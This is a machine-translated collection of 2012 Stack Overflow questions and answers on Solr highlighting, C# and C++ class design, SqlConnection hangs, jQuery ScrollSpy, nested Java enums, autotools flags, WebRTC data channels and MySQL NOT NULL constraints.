我索引了类似“一个有效的示例 dns 条目”之类的东西。当我在突出显示的响应中搜索“名称”（不带引号）时，我得到“一个有效的示例 dns**条目**”。如您所见，词项已突出显示。
此外，搜索“system”会导致“A sample dns entry **that** works”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T17:09:41.100

看起来像一个已知[问题](https://issues.apache.org/jira/browse/SOLR-3390)。提到了一个修复（将 luceneMatchVersion 设置为 LUCENE_33）。不确定它是否适合你。让我们希望他们尽快修复它。

# c# - 子类和可变继承

> ID：10218225
> 
> 赞同：0
> 
> 时间：2012-04-18T21:22:35.760
> 
> 标签：c#

我开始和我的朋友在 C# 的 XNA 游戏库中制作一些小游戏，并制作了一个`Player`类，它太大而无法发布，但有一个小受保护变量：

```
protected int moveSpeed = 3; (which affects how fast Player can move) 
```

我有一个子类`Fighter`，因为游戏将基于不同的战斗类型，我希望 Fighter 继承 Player 的属性（包括变量）。例如：`moveSpeed`，但是每当我尝试为 Fighter 分配一个特定的 moveSpeed 值时，它不会让我公开声明`moveSpeed = 2;`，例如并说： moveSpeed 是 a `FIELD`，但用作 a `TYPE`。没有`C#`直接的变量访问，或者仅适用于函数/方法。

PS：我从来没有在 C# 中搞过继承，只有 java。任何帮助表示赞赏，谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T21:26:24.730

你不想重新声明变量，你只想改变它的值。你最好在构造函数中做到这一点：

```
public class SomeTypeOfPlayer : Player
{
  //protected int moveSpeed = 2; DON'T DO THIS! It would be 
  //re-defining it, not setting the existing field.

  public SomeTypeOfPlayer()
  {
    moveSpeed = 2;  //Do this
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:28:29.190

查看描述您的代码*应*如下所示：

```
 public class Player
  {
       public double MoveSpeed {get;set}
  }

  public class Fighter : Player 
  {
  } 
```

`MoveSpeed`像基类的自动属性一样声明（避免声明类似的字段并`public`直接访问，但为此使用属性）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T22:12:40.557

根据您的描述，在我看来，您需要将**moveSpeed**设为常量（即无法在运行时更改）？我这样说是因为听起来你想要一个速度为 2 的基本**Player**，但想要创建一个能够以更快速度移动的**Fighter**派生类，但这些速度对于每种类型的播放器。

你不能有一个虚拟常量，但你可以有一个只有吸气剂的虚拟属性：

```
public virtual class Player
{
    protected virtual int MoveSpeed { get { return 2; } }
}

public class Fighter : Player
{
    protected override int MoveSpeed { get { return 3; } }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-18T21:29:36.867

您将 MoveSpeed 声明为一个`protected`字段。所以你可以在 Player 的派生类中访问它。但是你不能在那之外访问它。如果你有一个`Property`，你也可以在派生类之外访问它。当您创建一个自动实现的属性时，会在后台创建一个 Getter 和 Setter 方法来设置和检索备份字段的值（由 CLR 创建）。

假设你的类结构是这样的

```
public class Player
{
 public int MoveSpeed { set;get;}    
}

public class Fighter : Player
{
 public int FigherTypeId { set;get;}
} 
```

您应该可以像这样设置 Player MoveSpeed

```
Fighter objFighter=new Fighter();
objFighter.MoveSpeed=35; 
```

如果您想将该字段保留为`Protected`，您可以这样做并在子类构造函数中设置属性值

```
public class Player
{
 protected int MoveSpeed =3;

}
public class Fighter : Player
{
    public int FigherTypeId { set; get; }

    public Fighter(int _moveSpeed)
    {
        MoveSpeed = _moveSpeed;
    }
} 
```

并像这样创建子类对象

```
Fighter objFighter = new Fighter(44); 
```

[http://blogs.msdn.com/b/ericlippert/archive/2005/11/09/491031.aspx](http://blogs.msdn.com/b/ericlippert/archive/2005/11/09/491031.aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-18T21:31:54.840

> 每当我尝试为 Fighter 分配 moveSpeed 的特定值时，它不会让我公开声明 moveSpeed = 2;，例如并说：moveSpeed 是 FIELD，但用作 TYPE

通常，当您`moveSpeed = 2;`在类中编写赋值语句（如 ）时会发生这种情况，而它应该在方法或构造函数中。

错误消息有些令人困惑，但它是有道理的：类中的语句通常以类型 ( `int bla = 123;`) 开头，而在这种情况下，第一个单词是变量 ( `moveSpeed`) 的名称。

只需移动`moveSpeed = 2;`到您的构造函数（或方法或属性）即可解决问题。

# c++ - 在构造函数中，我可以获取成员的地址并依赖它们保持不变吗？

> ID：10218231
> 
> 赞同：1
> 
> 时间：2012-04-18T21:23:27.460
> 
> 标签：c++, constructor

我有这行代码：

```
boneHierarchy = BoneHierarchy(Point3D(24.5f,
                                       84.0f + HumanBoundingBox::HEIGHT/2.0f ,24.5f
                                      ),
                              CompassRadians(0.0f),
                              renderingEngine
                             ); 
```

BoneHierarchy 有一些向量作为私有成员。我获取向量的地址并将它们传递给渲染类。但是当我调用向量的 size 成员函数时，我得到了垃圾。我正在获取向量的地址，而不是其中的元素。

```
BoneHierarchy::BoneHierarchy(Point3D const& position,
                             CompassRadians const& heading,
                             Renderer* renderingEngine) : counter(0), renderingEngine(renderingEngine)
{    

    CoordinateSystem bodyCoordSys = CoordinateSystem(
                                                     Vector3D(0.0f,1.0f,0.0f),
                                                     Vector3D(0.0f,0.0f,1.0f));

    map<Normal3D::enumeration, TextureCoordinates> cubeTextureKind;
    Normal3D::enumeration normal;
    for (normal = Normal3D::begin(); normal != Normal3D::end(); ++normal)
    {
        cubeTextureKind[normal] = TextureAtlas::textureAtlasCoordLookup(WOOD);
    }
    Bone body = Bone(
                     Vector3D(0.0f, HumanBoundingBox::HEIGHT/2.0f,0.0f),
                     HumanBoundingBox::DIM,
                     Euler3D(0.0f,0.0f,0.0f),
                     cubeTextureKind,
                     bodyCoordSys);
    //TODO there are two positions for the human, one here and one in mesh vbo, unify these into one.
    body.setPosition(Vector3D(position.getX(),position.getY(),position.getZ()));
    body.setEuler(Euler3D((float) (Math::toDegrees(heading.getValue())),0.0f,0.0f));
    drawBone(body,UPDATE_ALL);
    root = body;

    map<string,Renderer::Buffer> vboVariableMap;
    vboVariableMap["aVertexPosition"] = Renderer::Buffer(verticesBuf);
    vboVariableMap["aTextureCoord"] = Renderer::Buffer(texCoordsBuf);
    vboVariableMap["index"] = Renderer::Buffer(indicesBuf);
    cout << "aBoneIndex " << boneIndexBuf.size() << endl;
    vboVariableMap["aBoneIndex"] = Renderer::Buffer(boneIndexBuf);
    vboVariableMap["uBoneMatrix0"] = Renderer::Buffer(transformMatrixBuf);
    GLuint textureID = 0; 
    Renderer::VBODescription vboDescription = Renderer::VBODescription("boneShader",
                                                                       vboVariableMap,
                                                                       GL_DYNAMIC_DRAW,
                                                                       indicesBuf.size(),
                                                                       textureID);
    bufferID = renderingEngine->registerBuffer(vboDescription);
    cout << "bufferID " << bufferID << endl;
    renderingEngine->printBoneIndexSize();
    cout << &(getBoneIndexBuf()) << endl;
}

Renderer::Buffer::Buffer(vector<GLfloat> const& data):
floatData(&data), ushortData(NULL), target(GL_ARRAY_BUFFER)
{
    printf("pointer: %p, size: %lu\n", floatData, floatData->size());
}

Renderer::Buffer::Buffer(vector<GLushort> const& data):
floatData(NULL), ushortData(&data), target(GL_ELEMENT_ARRAY_BUFFER)
{
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:29:22.447

如果`BoneHierarchy`接受 a`Point3D`和 a的构造函数`CompassRadians`计算它自己的向量成员的地址，那很好。他们的地址不会改变。

The code also shows an assignment statement. The addresses of the vector members of the temporary `BoneHierarchy` on the right will be different from those of the `BoneHierarchy` object stored in `boneHierarchy` on the left. Make sure you're not copying the addresses in your assignment operator, or else the `boneHierarchy` object will end up referring to the vector members of a temporary object that doesn't exist anymore. You'll also want to check your copy constructor.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:29:15.863

他们的地址不会改变。此外，如果你不在初始化列表中，它们的内容应该在整个构造过程中都是有效的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:33:45.990

There is not enough code provided here. Assuming that you only wanted to create an instance, use this line of code instead:

```
 BoneHierarchy boneHierarchy(Point3D(24.5f, 84.0f + HumanBoundingBox::HEIGHT/2.0f ,24.5f), 
 CompassRadians(0.0f), renderingEngine); 
```

This would create an instance in the local stack. As rob pointed out, you must be invoking the assignment operator to BoneHierarchy.

# c# - 为什么我的应用程序在尝试关闭 SqlConnection 对象时挂起？

> ID：10218244
> 
> 赞同：7
> 
> 时间：2012-04-18T21:24:39.580
> 
> 标签：c#, sql, sql-server, ado.net

我正在尝试从 SQL Server 上的 SQL 表中获取 C# 中的列信息。我正在关注此链接中的示例：http: [//support.microsoft.com/kb/310107](http://support.microsoft.com/kb/310107)我的程序在尝试关闭连接时奇怪地挂断了。如果连接没有关闭，则程序退出而没有任何异常。这是我的代码：

```
SqlConnection connection = new SqlConnection(@"MyConnectionString"); 
connection.Open();
SqlCommand command = new SqlCommand("SELECT * FROM MyTable", connection);
SqlDataReader reader = command.ExecuteReader(CommandBehavior.KeyInfo); // If this is changed to CommandBehavior.SchemaOnly, the program runs fast.
DataTable table = reader.GetSchemaTable();
Console.WriteLine(table.Rows.Count);
connection.Close(); // Alternatively If this line is commented out, the program runs fast. 
```

将`SqlConnection`内部放入 using 块也会导致应用程序挂起，除非`CommandBehavior.KeyInfo`将其更改为`CommandBehavior.SchemaOnly`.

```
using (SqlConnection connection = new SqlConnection(@"MyConnectionString"))
{
    connection.Open();
    SqlCommand command = new SqlCommand("SELECT * FROM MyTable", connection);
    SqlDataReader reader = command.ExecuteReader(CommandBehavior.KeyInfo); // If this is changed to CommandBehavior.SchemaOnly, the program runs fast even here in the using
    DataTable table = reader.GetSchemaTable();
    Console.WriteLine(table.Rows.Count);
} 
```

有问题的表有超过 300 万行，但由于我只获取 Schema 信息，我认为这不是问题。我的问题是：为什么我的应用程序在尝试关闭连接时卡住了？

**解决方案**：也许这不是最佳的，但它确实有效；我在调用连接`command.Cancel();`之前插入了一条语句：`Close`

```
SqlConnection connection = new SqlConnection(@"MyConnectionString"); 
connection.Open();
SqlCommand command = new SqlCommand("SELECT * FROM MyTable", connection);
SqlDataReader reader = command.ExecuteReader(CommandBehavior.KeyInfo); // If this is changed to CommandBehavior.SchemaOnly, the program runs fast.
DataTable table = reader.GetSchemaTable();
Console.WriteLine(table.Rows.Count);
command.Cancel(); // <-- This is it.
connection.Close(); // Alternatively If this line is commented out, the program runs fast. 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-19T01:52:52.683

我很久以前就看到过这样的事情。对我来说，这是因为我做了类似的事情：

```
SqlCommand command = new SqlCommand("SELECT * FROM MyTable", connection);
SqlDataReader reader = command.ExecuteReader();

// here, I started looping, reading one record at a time
// and after reading, say, 100 records, I'd break out of the loop

connection.Close();  // this would hang 
```

问题是该命令似乎想要完成。也就是说，遍历整个结果集。我的结果集有数百万条记录。它会完成……最终。

`command.Cancel()`我通过在调用之前添加调用解决了这个问题`connection.Close()`。

有关详细信息，请参阅[http://www.informit.com/guides/content.aspx?g=dotnet&seqNum=610](http://www.informit.com/guides/content.aspx?g=dotnet&seqNum=610)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:33:21.233

总体而言，它看起来对我来说是正确的，我认为您需要进行一些优化。除了上述关于避免使用 DataReader 的建议外，我还建议使用连接池。您可以从这里获取详细信息：

[http://www.techrepublic.com/article/take-advantage-of-adonet-connection-pooling/6107854](http://www.techrepublic.com/article/take-advantage-of-adonet-connection-pooling/6107854)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:48:53.817

你能试试这个吗？

```
DataTable dt = new DataTable(); 
using(SqlConnection conn = new SqlConnection("yourConnectionString"))
{
    SqlCommand cmd = new SqlCommand("SET FMTONLY ON; " + yourQueryString + "; SET FMTONLY OFF;",conn);  
    conn.Open(); 
    dt.Load(cmd.ExecuteReader()); 
} 
```

[从 MSDN设置 FMTONLY ON/OFF](http://msdn.microsoft.com/en-us/library/ms173839.aspx)似乎是要走的路

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-18T22:02:26.643

有一种特定的方法可以做到这一点，**使用 SMO（SQL Server 管理对象）**

你可以获取数据库中表的集合，然后读取你感兴趣的表的属性（列、键，以及所有可以想象的属性）

这是 SSMS 用来获取和设置所有数据库对象的属性的。

看看这个参考：

*   [Database.Tables 属性](http://msdn.microsoft.com/en-us/library/microsoft.sqlserver.management.smo.database.tables.aspx)
*   [表类](http://msdn.microsoft.com/en-us/library/microsoft.sqlserver.management.smo.table.aspx)

这是如何获取表属性的完整示例：

*   [使用 SMO 检索 SQL Server 2005 数据库信息：数据库信息、表信息](http://www.aspfree.com/c/a/MS-SQL-Server/Retrieving-SQL-Server-2005-Database-Info-Using-SMO-Database-Info-Table-Info/)

这将允许您以非常简单的方式从数据库中获取所有可能的信息。VB.NET 和 C# 中有大量示例。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-19T00:47:37.217

我会尝试这样的事情。这可确保清理所有项目 - 并避免使用 DataReader。除非您有异常大量的数据会导致内存问题，否则您不需要这个。

```
 public void DoWork(string connectionstring)
    {
        DataTable dt = new DataTable("MyData");
        using (var connection = new SqlConnection(connectionstring))
        {
            connection.Open();
            string commandtext = "SELECT * FROM MyTable";

            using(var adapter = new SqlDataAdapter(commandtext, connection))
            {
                adapter.Fill(dt);
            }
            connection.Close();
        }
        Console.WriteLine(dt.Rows.Count);
    } 
```

# jquery-plugins - 重复滚动间谍

> ID：10218246
> 
> 赞同：1
> 
> 时间：2012-04-18T21:24:42.983
> 
> 标签：jquery-plugins

我使用了一个 jQueryScrollSpy (https://github.com/sxalexander/jquery-scrollspyhttps://github.com/sxalexander/jquery-scrollspy) 来设置它，这样当你滚动到 div #red 时，它各自的子 ' .test' 淡入。如何设置它，以便当您滚动到 N div 的顶部时，会出现 N 的子项？（离开 div N 后消失。）

谢谢你的帮助，我从来没有设置过这种循环。

乔

```
<script type="text/javascript">
            $(document).ready(function() {
                    $(".test").hide();

                    $('#red').each(function(i) {
                        var position = $(this).position();
                        console.log(position);
                        console.log('min: ' + position.top + ' / max: ' + parseInt(position.top + $(this).height()));
                        $(this).scrollspy({
                            min: position.top,
                            max: position.top + $(this).height(),
                            onEnter: function(element, position) {
                                if(console) console.log('entering.#red');
                                $("#red").children().fadeIn(200);},

                            onLeave: function(element, position) {
                                if(console) console.log('leaving.#red');
                                $("#red").children().fadeOut(200);}

                            /*onEnter: function(element, position) {
                                if(console) console.log('entering.#blue');
                                $(".test").show();},

                            onLeave: function(element, position) {
                                if(console) console.log('leaving.#blue');
                                $(".test").hide();}*/
                        });
                    });
                });
            </script> 
```

# java - Java 中类似枚举的嵌套树结构 - 对通常嵌套枚举 Q 和 As 的不同看法

> ID：10218248
> 
> 赞同：0
> 
> 时间：2012-04-18T21:25:01.407
> 
> 标签：java, enums, tree, nested, structure

我需要在 Java 中嵌套枚举。但是，在查看 Stackoverflow 和更大的网络时，我发现似乎没有关于嵌套枚举的一般约定。我见过很多不同的解释，但没有一个符合我的需要。

因此，让我从讨论我的要求开始：

我需要枚举来允许命名约定和我的 Java 应用程序中事件类型的简单树类型结构。例如

```
Event.Draw.Square;
Event.Draw.Circle;
Event.Draw.Triangle;
Event.Draw.Poly;
Event.Draw.Line;

Event.File.Load;
Event.File.Save;

Event.Screen.Zoom;
Event.Screen.Flip;

Event.Ui.New;
Event.Ui.Close; 
```

我将如何在代码中设想这一点，但显然它是不正确的。请提供有关如何使用枚举获取此信息的任何指示？

```
private enum event
{
    Draw {Square, Circle, Triangle, Poly, Line},
    File {Save, Save_As, Load},
    Screen {Zoom, Flip, Rotate_CW, Rotate_CCW},
    Ui {New_Workspace, Close}   
} 
```

然后我想要一个 case 语句或条件结构能够对 Event.Screen 或 Event.Screen.Zoom 采取行动。例如，请参见以下方法：

```
public void evenTriggered(Event event)
{
    switch (event)
    {
    case Event.Draw:
            drawEvent(event.Draw);
    case Event.UI:
            uiEvent(event.Ui);
    case Event.Screen:
            screenEvent(event.Screen);
    case Event.File
            fileEvent(event.File);
    default: ;//do nothing

    }//end switch
}//end eventTriggered

public void drawEvent(Event.Draw event)
{

    switch(event.draw)
    {
    case Event.Draw.Square:
            workspace.addSquare();
        break;
    case Event.Draw.Circle:
            workspace.addCircle();
         break;  
    case Event.Draw.Triange:
        workspace.addTriangle();
         break;
     default: ;//do nothing

    };//end switch

}//end drawEvent 
```

感谢您花时间阅读我的帖子，我期待您的建议。

安德鲁。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:35:36.720

嵌套枚举仅在您也有操作时才有意义`is a descendant of`。这是您在第一个代码示例中的建议。内置的 Java 枚举实现中没有这样的东西，我看不出它如何适合那里。

但是，您可以自由地使用私有构造函数和`public static final`实例来实现自己的类似枚举的类，就像我们在`enum`将 s 添加到 Java 之前所做的那样。有一些警告，比如序列化，但它是可行的。

你也可以这样做：

```
public enum Foo {

EVENT,
EVENT_DRAW,
EVENT_DRAW_CIRCLE;

public boolean isDescendantOrSelf( Foo other ) {
    return other.name().startsWith( this.name() );
}

} 
```

它并不完美，因为您将无法在 switch/case 语句中使用它们，但它确实为您的平面枚举值提供了基于其名称的树结构。（但不要使用我的实现，它还不够好，我只是想展示这个概念。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T21:31:32.733

为什么需要嵌套枚举？在我看来，你正在做的事情是非常反 OOP 的。您应该有一个基类 Event，让 Draw、File、UI 和 Screen 类继承它，然后如果必须（对于 DrawEvent、FileEvent 等），则使用您的枚举最终说明特定事件的类型。另一种选择是静态整数，另一种选择是甚至将“最具体”的事件类型设为另一个类。您将拥有以下内容：

```
public void drawEvent(DrawEvent event)
{

    switch(DrawEvent.type) // type is of datatype DrawEventType, an enum
    {
    case DrawEventType.Square:
            workspace.addSquare();
            break;
    case DrawEventType.Circle:
            workspace.addCircle();
            break;  
    } //etcetera
} 
```

或使用静态整数：

```
public void drawEvent(DrawEvent event)
{

    switch(DrawEvent.type) // type is one of the DrawEvent static integers
    {
    case DrawEvent.SQUARE:
            workspace.addSquare();
            break;
    case DrawEvent.CIRCLE:
            workspace.addCircle();
            break;  
    } //etcetera
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T20:25:31.503

好的，在收到好的建议后，我相信我有一个可行的解决方案来满足我的要求，我想与你分享。

基本解决方案是创建一个具有两个字段的对象，这两个字段都是枚举。一个是类别，一个是事件。然后我可以为每个类别创建对象的公共静态常量实例，事件配对。通过保持构造函数私有，实例不能在外部创建，因此错误地将选项限制为仅定义为常量和公共的选项。

我现在可以在 EventType 类型中保存任何这些常量实例化。对我来说，这个事件类型将保存在一个 Event 对象中，该对象将与一个中央事件系统一起使用，所有 UI 元素都将注册到该系统以接收应用程序范围的事件通知，例如 redraw()。

```
public class EventType
{
    public enum EventCategory{Draw, File, Screen, UI};

    public enum Event {Load, Save, Circle, Square, Triangle, Poly, Line, Flip, Zoom, Close,NewWorkspace};

    public final EventType FILE_LOAD = new EventType(EventCategory.File, Event.Load);
    public final EventType FILE_SAVE = new EventType(EventCategory.File, Event.Load);
    public final EventType DRAW_CIRCLE = new EventType{EventCategory.Draw, Event.Circle};
    public final EventType DRAW_SQUARE = new EventType{EventCategory.Draw, Event.Square};
    public final EventType DRAW_TRIANGLE = new EventType{EventCategory.Draw, Event.Triangle};
    public final EventType DRAW_POLY = new EventType{EventCategory.Draw, Event.Poly};
    public final EventType DRAW_LINE = new EventType{EventCategory.Draw, Event.Line};
    public final EventType SCREEN_FLIP = new EventType{EventCategory.Screen, Event.Flip};
    public final EventType SCREEN_ZOOM = new EventType{EventCategory.Screen, Event.zoom};
    public final EventType UI_CLOSE = new EventType{EventCategory.UI, Event.Close};
    public final EventType UI_NEW_WORKSPACE =  new EventType{EventCategory.UI, Event.NewWorkspace};

    public Event event;
    public EventCategory category;

    private EventType(EventCategory cat,  Event evt)
    {
        event = evt;
        category = cat;
    }//end constructor

}//end class 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T02:35:06.183

[你可以做一些类似我对ID3 Java Enum Tree](https://stackoverflow.com/questions/10233099/id3-java-enum-tree/10234825#10234825)的回答。您可能需要孩子的父指针。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-07T06:34:17.857

这可以使用枚举的接口来完成。

```
public interface Event {
}

public enum Draw implements Event {
  SQUARE, CIRCLE, TRIANGLE, POLY, LINE;
}

public enum File implements Event {
  LOAD, SAVE;
}

public enum Screen implements Event {
  ZOOM, FLIP;
}

public enum Ui implements Event {
  NEW, CLOSE;
} 
```

现在您可以使用以下条件结构对这些枚举事件做出反应：

```
public void evenTriggered(Event event)
{
  if(event instanceof Draw) {
    drawEvent((Draw)event);
  }
  else if(event instanceof Ui) {
    uiEvent((Ui)event);
  }
  else if(event instanceof Screen) {
    screenEvent((Screen)event);
  }
  else if(event instanceof File) {
    fileEvent((File)event);
  }
  else {
    //do nothing
  }
}//end eventTriggered

public void drawEvent(Draw event)
{

  switch(event)
  {
    case SQUARE:
      workspace.addSquare();
      break;
    case CIRCLE:
      workspace.addCircle();
      break;  
    case TRIANGLE:
      workspace.addTriangle();
      break;
    default: ;//do nothing

  };//end switch

}//end drawEvent 
```

# autotools - 如何在子包设置中传播 automake 变量？

> ID：10218249
> 
> 赞同：3
> 
> 时间：2012-04-18T21:25:02.187
> 
> 标签：autotools, autoconf, automake

我在我的 autotools 存储库中有一个子包设置，其中几个相关项目使用主 configure.ac 和 Makefile.am 粘合在一起。

除了通过 AC_CONFIG_SUBDIRS() 宏轻松完成的编译顺序之外，还需要导出这些过度耦合的子项目之间所需的头文件和库位置。

```
--- configure.ac
 |- Makefile.am
 |- subproj1 --- configure.ac
 |            |- Makefile.am
 |            |- src
 |            \- include
 [...]
 |
 \- subprojN --- configure.ac // requires -I${top_srcdir}/subprojX/include and
              |- Makefile.am  // -L${top_srcdir}/subprojX/src
              |- src
              \- include 
```

不幸的是，将这些包重新组合为一个不是一种选择。我尝试使用 AC_SUBST() 和/或 make 的导出命令导出变量，但无济于事。

我可以将这些标志用于每个子项目 Makefile 的唯一方法是将 CPPFLAGS 和 LDFLAGS 传递到根配置调用（通过命令行）。但是，我希望是否有办法将这些值保留在 autotools 中，而不必为它们创建单独的脚本。

PS：类似于[automake和项目依赖](https://stackoverflow.com/questions/8216181/automake-and-project-dependencies)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-25T12:14:05.497

autotools 并不是真正设计为包管理系统，所以这是一个尴尬的用法，但可以在子项目中引用构建树之外的相对路径。换句话说，在 subprojN/Makefile.am 中，您可以添加：

```
AM_CPPFLAGS = -I$(srcdir)/../subprojX/include
AM_LDFLAGS = -L$(srcdir)/../subprojX/lib 
```

在这种情况下，如果 subprojN/configure 试图找到 libsubprojX，它将失败，除非您改为添加`../subprojX/{include,lib}`到 CPPFLAGS 和 LDFLAGS 进行配置，这可以在 configure.ac 中完成：

```
CPPFLAGS="$CPPFLAGS -I${srcdir}/../subprojX/include
LDFLAGS="$LDFLAGS -L${srcdir}/../subprojX/lib" 
```

如果子项目的配置脚本没有检查耦合子项目中的库，那么在 Makefile.am 中指定 LDADD 以获取必要的库链接可能会更干净。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-20T13:43:09.693

CPPFLAGS and LDFLAGS should almost never be passed directly on the command line (personal opinion) but should be set in a config.site. Simply make the assignments in ${prefix}/share/config.site or in $CONFIG_SITE (ie, in the file $HOME/config.site and set CONFIG_SITE=$HOME/config.site in the environment in which you run configure) and that script will be sourced by all of your configure invocations. I'm not sure exactly what you mean by "keep these values inside autotool stuff", but it strikes me that using a config.site satisfies that. LDFLAGS and CPPFLAGS are the correct mechanism to tell your configure script the non-standard location of libraries, so any solution that does not use those would be outside the normal scope of the autotools. (Of course, the best solution is to install the libraries in a standard location so your toolchain can find them with no extra effort on your part. Perhaps you are using gcc and can set LIBRARY_PATH and CPATH.)

# javascript - 使用 WebRTC 在浏览器之间传输 JSON

> ID：10218250
> 
> 赞同：16
> 
> 时间：2012-04-18T21:25:02.747
> 
> 标签：javascript, webrtc

当我最初听说 WebRTC 的前景时，我感到很兴奋。这听起来像 websockets，但没有服务器。不幸的是，我能找到的所有教程都强调了 WebRTC 的视频和音频方面。我找不到任何关于在浏览器之间发送文本/数据/JSON 的信息。你能帮我写一个简单的 hello world 吗，只需使用 WebbRTC 从一个浏览器向另一个浏览器发送一些数据？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-18T21:42:22.047

这是在黑暗中的尝试，但最新的 Web API 编辑器草案有一个`DataChannel`接口作为[Peer-to-Peer Data API 的](http://dev.w3.org/2011/webrtc/editor/webrtc.html#peer-to-peer-data-api)一部分。

但是，当前的[工作草案](http://www.w3.org/TR/2012/WD-webrtc-20120209/)没有这个 API，所以它可能是非常新的并且尚未实现。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-01-11T10:47:32.340

DataChannel 现已在 Firefox (18+) 和 Chrome (25+) 中实现，但仍处于早期阶段。

有关更多信息，请参阅 HTML5 Rocks 文章[WebRTC 入门](http://www.html5rocks.com/en/tutorials/webrtc/basics/#toc-rtcdatachannel)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-06-09T10:35:58.683

这是一个老问题，但是因为我开始学习webRTC，所以我会尝试回答它。

首先是一些误解：

> 听起来像 websockets 但没有服务器

在正确交换和协商某些信息（媒体会话管理、节点的网络配置/多媒体功能）之前，无法在 WebRTC 对等点之间传输任何数据。为此，您需要一个服务器和[信令](http://www.html5rocks.com/en/tutorials/webrtc/infrastructure/)（它不是 webRTC 的一部分：您可以按照您想要的方式实现它）。

信令完成后，您需要使用以下内容创建[RTCPeerConnection](http://www.html5rocks.com/en/tutorials/webrtc/basics/)：

```
if (navigator.webkitGetUserMedia) {
   RTCPeerConnection = webkitRTCPeerConnection;
} else if(navigator.mozGetUserMedia){
   RTCPeerConnection = mozRTCPeerConnection;
   RTCSessionDescription = mozRTCSessionDescription;
   RTCIceCandidate = mozRTCIceCandidate;
} 
```

接着：

```
var connection = new RTCPeerConnection(servers); 
```

在此之后，您可以将您的数据通道添加到此 PeerConnection：

```
var dataChannel = connection.createDataChannel("channelName",{ reliable: true }); 
```

完成后，您只需拨打电话`sendChannel.send('Any data you want');`，这将发送您想要的任何数据。

如果有的话，我发现[这本书真的很有帮助](https://rads.stackoverflow.com/amzn/click/com/1449371876)。它留下了很多悬而未决的问题，但对于第一次开始它是好的。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-19T00:20:49.387

此功能尚未在任何发布的 WebRTC 实现中实现。正如其他发帖人所指出的，最新的 WebRTC 编辑草案中现在有一个 DataChannel API，但它的协议仍在研究中。预计今年晚些时候会在 Chrome 和 Firefox 中看到这个 API。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-01-10T23:55:39.823

我相信马特已经知道了，但对于谷歌客人：是的，你可以，使用 DataChannels。

在你身边：

```
channel = somePeerConnection.createDataChannel("a Label");
channel.onopen = function() { channel.send("any thing") }; 
```

另一方面：

```
somePeerConnection.ondatachannel = function (evt) {
   evt.channel.onmessage = function (evt) {
       alert( evt.data );
   };
}; 
```

请参阅此示例：

*   [http://www.w3.org/TR/webrtc/#examples](http://www.w3.org/TR/webrtc/#examples)
*   [https://hacks.mozilla.org/2012/11/progress-update-on-webrtc-for-firefox-on-desktop/#file-datachannels-js-LC12](https://hacks.mozilla.org/2012/11/progress-update-on-webrtc-for-firefox-on-desktop/#file-datachannels-js-LC12)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-24T19:58:28.913

[http://peerjs.com/](http://peerjs.com/)正在发展并为您提供类似 websocket 的语法，用于浏览器实例之间的 p2p 数据传输

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-19T21:34:13.000

正如贾斯汀所说，协议和 API 仍在确定中；在最新的 IETF 中，我提交了一份 JS API 下的次要协议草案。最终形式很可能与编辑草稿中的当前提案非常接近，但您可能还需要等待接收方的“onopened”。

该 API 以 WebSocket api 为模型，以简化将代码从 WebSocket 实现移动到 DataChannels，尽管并非 WebSocket 中的所有项目（例如 url）都可以保留，并且显然 DataChannel 添加了许多与不可靠或不可靠的 WebSockets 无关的功能部分可靠的数据。

# mysql - 将 NOT NULL 约束添加到列

> ID：10218252
> 
> 赞同：3
> 
> 时间：2012-04-18T21:25:13.883
> 
> 标签：mysql, sql, phpmyadmin

我正在使用 PHPMyAdmin，并尝试将 NOT NULL 约束添加到表的列中。

PHPMyAdmin 接受我的以下查询：

```
ALTER TABLE `wall` MODIFY `token_message` varchar(40) NOT NULL; 
```

但是我仍然可以插入空字符串（=NULL），我不明白为什么。

PS：如果您要给我一些其他查询来添加此约束，请注意我已经尝试过这 3 个在我的 PHPMyAdmin 中不起作用（错误类型：#1064 - 您的 SQL 语法有错误; 检查手册）：

```
ALTER TABLE `wall` ALTER COLUMN `token_message` SET NOT NULL;
ALTER TABLE `wall` ALTER COLUMN `token_message` varchar(40) NOT NULL;
ALTER TABLE `wall` MODIFY `token_message` CONSTRAINTS token_message_not_null NOT NULL; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-18T21:34:55.270

您写道，“我仍然可以插入空字符串 (=NULL)”，这听起来像是一种误解。在 SQL 中，空字符串不会计算为 NULL，反之亦然。尝试插入一个空字符串并执行`SELECT from wall where token_message is NULL`. 你应该得到零行。`NULL`然后尝试在您指定（未引用）作为列值的地方进行插入，您应该会收到预期的错误消息。

